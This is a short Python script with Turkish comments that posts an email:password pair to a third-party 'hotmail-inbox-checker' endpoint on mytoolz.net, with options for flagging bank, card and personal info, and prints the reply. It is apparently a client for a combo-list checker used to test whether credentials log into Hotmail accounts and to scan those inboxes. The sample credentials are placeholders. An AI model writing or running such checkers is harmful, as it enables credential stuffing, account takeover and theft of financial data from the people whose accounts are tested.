import urllib.request
import urllib.parse
import json

# Hedef API adresi ve gönderilecek parametreler
url = "https://mytoolz.net/ajax/hotmail-inbox-checker.php"
payload = {
    'ajax': '1',
    'do': 'check',
    'mailpass': 'test@example.com:password123',
    'delim': '|',
    'email': '1',
    'bank': '0',
    'card': '0',
    'info': '0'
}

# Veriyi URL-encoded formatına dönüştür
post_data = urllib.parse.urlencode(payload).encode('utf-8')

# İsteği oluştur ve User-Agent başlığını ekle
req = urllib.request.Request(url, data=post_data, method='POST')
req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')

try:
    with urllib.request.urlopen(req) as response:
        status_code = response.getcode()
        response_body = response.read().decode('utf-8')
        print(f"HTTP Status: {status_code}")
        print(f"Response: {response_body}")
except Exception as e:
    print(f"Hata oluştu: {e}")
